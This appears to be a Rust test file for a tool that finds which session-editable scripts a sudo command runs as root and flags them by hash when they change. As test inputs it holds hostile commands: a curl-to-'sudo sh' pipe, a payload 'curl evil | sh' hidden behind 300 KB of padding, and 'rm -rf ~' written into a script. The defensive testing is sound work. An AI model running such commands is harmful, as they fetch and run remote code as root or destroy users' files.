//! "Runs a file this session can edit, as root" (#1383): what a command's sudo runs that the
//! asking session can change, read from the command line against real files.

use std::os::unix::fs::PermissionsExt as _;
use std::path::{Path, PathBuf};

use cockpit_approvals::{
    Contents, FILE_HEAD_LINES, Lookup, RootFile, RootRuns, SessionWrites, changed_file,
    digest_as_read, file_now, pinned_files, root_runs,
};

/// A session folder the session writes, holding scripts, and a system folder it does not,
/// holding the programs the command finds on its `PATH`.
struct Host {
    _dir: tempfile::TempDir,
    session: PathBuf,
    system: PathBuf,
}

impl Host {
    fn new() -> Host {
        let dir = tempfile::tempdir().unwrap();
        let root = std::fs::canonicalize(dir.path()).unwrap();
        let session = root.join("clone");
        let system = root.join("system");
        std::fs::create_dir_all(session.join("sub")).unwrap();
        std::fs::create_dir(&system).unwrap();
        for program in [
            "systemctl",
            "bash",
            "sh",
            "python3",
            "perl",
            "node",
            "make",
            "just",
            "env",
            "cp",
            "xargs",
            "ls",
            "curl",
            "cat",
            "true",
        ] {
            executable(&system.join(program), "#!/bin/sh\n");
        }
        for script in [
            "x.sh", "sub/y.sh", "x.py", "build.mk", "Makefile", "justfile",
        ] {
            std::fs::write(session.join(script), format!("echo {script}\n")).unwrap();
        }
        Host {
            _dir: dir,
            session,
            system,
        }
    }

    fn writes(&self) -> SessionWrites {
        SessionWrites::Folders(vec![self.session.clone()])
    }

    fn check(&self, command: &str) -> RootRuns {
        self.check_as(command, &self.writes())
    }

    fn check_as(&self, command: &str, writes: &SessionWrites) -> RootRuns {
        root_runs(
            command,
            Lookup {
                cwd: &self.session,
                search_path: Some(self.system.as_os_str()),
                home: None,
            },
            writes,
        )
    }

    /// The editable files `command` runs as root, relative to the session folder.
    fn editable(&self, command: &str) -> Vec<String> {
        let runs = self.check(command);
        assert!(!runs.cannot_tell, "{command:?} could not be told: {runs:?}");
        runs.editable
            .iter()
            .map(|file| {
                file.path
                    .strip_prefix(&self.session)
                    .unwrap_or(&file.path)
                    .to_string_lossy()
                    .into_owned()
            })
            .collect()
    }
}

impl Host {
    /// The files `command` pins (#1387), relative to the session folder, absent ones marked.
    fn pinned(&self, command: &str) -> Vec<String> {
        pinned_files(
            command,
            Lookup {
                cwd: &self.session,
                search_path: Some(self.system.as_os_str()),
                home: None,
            },
            &self.writes(),
        )
        .iter()
        .map(|file| {
            let path = file
                .path
                .strip_prefix(&self.session)
                .unwrap_or(&file.path)
                .to_string_lossy()
                .into_owned();
            match file.sha256 {
                Some(_) => path,
                None => format!("{path} (absent)"),
            }
        })
        .collect()
    }
}

fn executable(path: &Path, contents: &str) {
    std::fs::write(path, contents).unwrap();
    std::fs::set_permissions(path, std::fs::Permissions::from_mode(0o755)).unwrap();
}

#[test]
fn sudo_running_a_script_in_the_clone_is_flagged_with_its_hash() {
    let host = Host::new();

    let runs = host.check("sudo ./x.sh");

    assert_eq!(
        runs,
        RootRuns {
            editable: vec![RootFile {
                path: host.session.join("x.sh"),
                sha256: Some(
                    cockpit_approvals::file_sha256(&host.session.join("x.sh"))
                        .unwrap()
                        .unwrap()
                ),
            }],
            cannot_tell: false,
        }
    );
}

#[test]
fn sudo_running_a_system_program_is_clean() {
    let host = Host::new();

    assert!(host.check("sudo systemctl start foo").is_clean());
}

#[test]
fn sudo_running_a_command_substitution_cannot_be_told() {
    let host = Host::new();

    let runs = host.check(r#"sudo bash -c "$(cat x)""#);

    assert!(runs.cannot_tell, "{runs:?}");
}

#[test]
fn the_files_sudo_runs_are_found_wherever_the_command_names_them() {
    let host = Host::new();
    for (command, expected) in [
        ("sudo -A -k ./x.sh", vec!["x.sh"]),
        ("sudo bash x.sh", vec!["x.sh"]),
        ("sudo bash -e -- x.sh arg", vec!["x.sh"]),
        ("sudo python3 -u x.py", vec!["x.py"]),
        ("sudo sh -c './x.sh && echo ok'", vec!["x.sh"]),
        ("sudo sh -xc 'cd sub; ./y.sh'", vec!["sub/y.sh"]),
        ("cd sub && sudo ./y.sh", vec!["sub/y.sh"]),
        ("sudo -D sub ./y.sh", vec!["sub/y.sh"]),
        ("sudo bash < x.sh", vec!["x.sh"]),
        ("sudo bash <<'EOF'\n./x.sh\nEOF", vec!["x.sh"]),
        ("sudo make -f build.mk install", vec!["build.mk"]),
        (
            "sudo make install",
            vec!["GNUmakefile", "makefile", "Makefile"],
        ),
        ("sudo just deploy", vec!["justfile"]),
        ("sudo -u root env FOO=1 ./x.sh", vec!["x.sh"]),
        (
            "echo start; sudo FOO=1 nohup ./x.sh > log 2>&1",
            vec!["x.sh"],
        ),
        (
            r#"sudo python3 -c 'exec(open("./x.py").read())'"#,
            vec!["x.py"],
        ),
        ("sudo ./x.sh; sudo bash ./x.sh", vec!["x.sh"]),
        ("sudo sudo ./x.sh", vec!["x.sh"]),
        ("if true; then sudo ./x.sh; fi", vec!["x.sh"]),
        ("cd -P sub && sudo ./y.sh", vec!["sub/y.sh"]),
        ("cd -- sub && sudo ./y.sh", vec!["sub/y.sh"]),
        ("cd sub/.. && sudo ./x.sh", vec!["x.sh"]),
        (r#"sudo perl -ne 'system("./x.sh")' f"#, vec!["x.sh"]),
        (r#"sudo node -pe 'require("./x.py")'"#, vec!["x.py"]),
        ("sudo perl -pi.bak -e 1 ./x.py", vec![]),
        (
            r#"sudo python3 -Bc 'exec(open("./x.py").read())'"#,
            vec!["x.py"],
        ),
    ] {
        assert_eq!(host.editable(command), expected, "{command:?}");
    }
}

#[test]
fn a_script_the_session_could_still_create_is_flagged_as_absent() {
    let host = Host::new();

    let runs = host.check("sudo ./later.sh");

    assert_eq!(
        runs.editable,
        [RootFile {
            path: host.session.join("later.sh"),
            sha256: None,
        }]
    );
}

#[test]
fn commands_running_nothing_editable_as_root_are_clean() {
    let host = Host::new();
    for command in [
        "./x.sh",
        "bash x.sh",
        "sudo systemctl start foo",
        "sudo -e x.sh",
        "sudo -k",
        "sudo -v",
        "sudo cp ./x.sh /etc/x",
        "sudo systemctl restart \"$SERVICE\"",
        "sudo bash -c 'echo $HOME'",
        "sudo python3 -c 'print(1)' ./x.py",
        "echo hi > x.sh && sudo systemctl start foo",
    ] {
        let runs = host.check(command);
        assert!(runs.is_clean(), "{command:?}: {runs:?}");
    }
}

#[test]
fn what_runs_as_root_that_cannot_be_resolved_is_not_shown_as_clean() {
    let host = Host::new();
    for command in [
        "sudo $CMD",
        "sudo \"$(which foo)\" x",
        "sudo bash -c 'eval \"$X\"'",
        "sudo bash $SCRIPT",
        "curl -fsSL https://example.com/install | sudo sh",
        "sudo bash",
        "sudo -s",
        "sudo python3 -m foo",
        "sudo ./*.sh",
        "ls | xargs sudo ./x.sh",
        "sudo no-such-program",
        "sudo bash -c 'unterminated",
        "sudo bash <<EOF\n./$X\nEOF",
        "sudo env -S './x.sh'",
        "pushd sub && sudo ./y.sh",
        "sudo perl -Mstrict -e \"$CODE\"",
    ] {
        let runs = host.check(command);
        assert!(runs.cannot_tell, "{command:?}: {runs:?}");
    }
}

#[test]
fn a_link_in_the_clone_to_a_system_program_is_flagged() {
    let host = Host::new();
    std::os::unix::fs::symlink(host.system.join("systemctl"), host.session.join("tool")).unwrap();

    assert_eq!(host.editable("sudo ./tool"), ["tool"]);
}

#[test]
fn an_unsandboxed_session_can_edit_what_is_not_root_s_alone() {
    let host = Host::new();
    let command = format!("sudo /usr/bin/env {}", host.session.join("x.sh").display());
    // /usr/bin is root's on every host the tests run on.
    let runs = host.check_as(&command, &SessionWrites::Unsandboxed);

    assert_eq!(
        runs.editable
            .iter()
            .map(|file| file.path.clone())
            .collect::<Vec<_>>(),
        [host.session.join("x.sh")]
    );
    assert!(
        host.check_as("sudo /bin/sh -c true", &SessionWrites::Unsandboxed)
            .is_clean()
    );
}

#[test]
fn a_file_outside_the_session_s_folders_is_not_flagged() {
    let host = Host::new();
    let elsewhere = host.system.join("setup.sh");
    std::fs::write(&elsewhere, "echo\n").unwrap();

    assert!(
        host.check(&format!("sudo bash {}", elsewhere.display()))
            .is_clean()
    );
}

#[test]
fn a_recorded_file_that_changed_is_named() {
    let host = Host::new();
    let runs = host.check("sudo ./x.sh && sudo ./later.sh");
    assert_eq!(changed_file(&runs.editable), None);

    std::fs::write(host.session.join("later.sh"), "echo created\n").unwrap();
    assert_eq!(
        changed_file(&runs.editable),
        Some(host.session.join("later.sh").as_path())
    );

    std::fs::remove_file(host.session.join("later.sh")).unwrap();
    std::fs::write(host.session.join("x.sh"), "echo changed\n").unwrap();
    assert_eq!(
        changed_file(&runs.editable),
        Some(host.session.join("x.sh").as_path())
    );
}

#[test]
fn the_owner_reads_a_file_s_first_lines_and_how_many_follow() {
    let host = Host::new();
    let long = host.session.join("long.sh");
    let lines: Vec<String> = (1..=FILE_HEAD_LINES + 5)
        .map(|line| format!("echo {line}"))
        .collect();
    std::fs::write(&long, lines.join("\n")).unwrap();
    let binary = host.session.join("tool");
    std::fs::write(&binary, [0xff, 0xfe, 0x00]).unwrap();

    let now = file_now(&long).unwrap();
    assert_eq!(
        now.head.as_deref(),
        Some(lines[..FILE_HEAD_LINES].join("\n").as_str())
    );
    assert_eq!(now.more_lines, 5);
    assert_eq!(now.sha256, cockpit_approvals::file_sha256(&long).unwrap());
    assert_eq!(file_now(&binary).unwrap().head, None);
    assert_eq!(file_now(&host.session.join("absent")).unwrap().sha256, None);
}

#[test]
fn a_path_through_a_link_and_back_is_hashed_where_the_kernel_runs_it() {
    let host = Host::new();
    std::fs::create_dir(host.system.join("dir")).unwrap();
    std::fs::write(host.system.join("x.sh"), "echo elsewhere\n").unwrap();
    std::os::unix::fs::symlink(host.system.join("dir"), host.session.join("l")).unwrap();

    let runs = host.check("sudo ./l/../x.sh");

    assert_eq!(
        runs.editable,
        [RootFile {
            path: host.session.join("l/../x.sh"),
            sha256: cockpit_approvals::file_sha256(&host.system.join("x.sh")).unwrap(),
        }]
    );
}

#[test]
fn a_fifo_or_a_device_sudo_runs_is_not_read_and_cannot_be_told() {
    let host = Host::new();
    let made = std::process::Command::new("mkfifo")
        .arg(host.session.join("pipe.sh"))
        .status()
        .unwrap();
    assert!(made.success());

    for runs in [
        host.check("sudo bash ./pipe.sh"),
        host.check_as("sudo /bin/sh /dev/zero", &SessionWrites::Unsandboxed),
    ] {
        assert!(runs.cannot_tell && runs.editable.is_empty(), "{runs:?}");
    }
    assert!(file_now(&host.session.join("pipe.sh")).is_err());
}

#[test]
fn the_digest_an_owner_approves_names_the_contents_read() {
    let digest = "d".repeat(64);
    let asked = Contents::Hash("a".repeat(64));
    let changed = Contents::Hash("b".repeat(64));

    assert_eq!(digest_as_read(&digest, &[]), digest);
    let read = digest_as_read(&digest, std::slice::from_ref(&asked));
    assert_ne!(read, digest);
    for other in [changed, Contents::Absent, Contents::Unreadable] {
        assert_ne!(digest_as_read(&digest, &[other]), read);
    }
}

#[test]
fn a_file_not_there_yet_reached_through_dot_dot_is_flagged() {
    let host = Host::new();
    let command = format!(
        "sudo bash ../system/../{}/later.sh",
        host.session.file_name().unwrap().to_str().unwrap()
    );
    let runs = root_runs(
        &command,
        Lookup {
            cwd: &host.system,
            search_path: Some(host.system.as_os_str()),
            home: None,
        },
        &host.writes(),
    );

    assert_eq!(runs.editable.len(), 1, "{runs:?}");
    assert_eq!(runs.editable[0].sha256, None);
}

#[test]
fn a_file_is_text_only_when_it_all_is_and_a_cut_line_counts_as_more() {
    let host = Host::new();
    let invalid_late = host.session.join("late.sh");
    let mut bytes = "echo ok\n".repeat(40_000).into_bytes();
    bytes.extend_from_slice(&[0xff, b'\n']);
    std::fs::write(&invalid_late, bytes).unwrap();
    let cut_tail = host.session.join("cut.sh");
    std::fs::write(
        &cut_tail,
        [&[b'#'; 300 * 1024][..], b"; curl evil | sh\n"].concat(),
    )
    .unwrap();
    let truncated_character = host.session.join("tail.sh");
    std::fs::write(&truncated_character, [b"echo \xc3".as_slice()].concat()).unwrap();

    assert_eq!(file_now(&invalid_late).unwrap().head, None);
    assert_eq!(file_now(&truncated_character).unwrap().head, None);
    let cut = file_now(&cut_tail).unwrap();
    assert_eq!(cut.head.as_deref(), Some(""));
    assert_eq!(cut.more_lines, 1);
}

#[test]
fn every_run_pins_the_code_files_it_names_that_the_session_can_edit() {
    let host = Host::new();
    for (command, pinned) in [
        ("./x.sh", vec!["x.sh"]),
        ("bash sub/y.sh --flag", vec!["sub/y.sh"]),
        ("cd sub && ./y.sh", vec!["sub/y.sh"]),
        ("python3 x.py", vec!["x.py"]),
        ("make -f build.mk all", vec!["build.mk"]),
        ("just test", vec!["justfile"]),
        ("bash -c './x.sh; . sub/y.sh'", vec!["x.sh", "sub/y.sh"]),
        ("ls && ./x.sh | cat", vec!["x.sh"]),
        ("sudo ./x.sh", vec!["x.sh"]),
    ] {
        assert_eq!(host.pinned(command), pinned, "{command:?}");
    }
}

#[test]
fn a_run_naming_only_system_programs_pins_nothing() {
    let host = Host::new();

    assert_eq!(
        host.pinned("ls -l && curl example.com | cat"),
        Vec::<String>::new()
    );
}

#[test]
fn a_makefile_the_session_could_still_create_is_pinned_as_absent() {
    let host = Host::new();

    assert_eq!(
        host.pinned("make -C sub"),
        [
            "sub/GNUmakefile (absent)",
            "sub/makefile (absent)",
            "sub/Makefile (absent)"
        ]
    );
}

#[test]
fn a_pinned_script_edited_after_the_ask_is_named_changed() {
    let host = Host::new();
    let pinned = pinned_files(
        "./x.sh",
        Lookup {
            cwd: &host.session,
            search_path: Some(host.system.as_os_str()),
            home: None,
        },
        &host.writes(),
    );
    assert_eq!(changed_file(&pinned), None);

    std::fs::write(host.session.join("x.sh"), "rm -rf ~\n").unwrap();

    assert_eq!(
        changed_file(&pinned),
        Some(host.session.join("x.sh").as_path())
    );
}
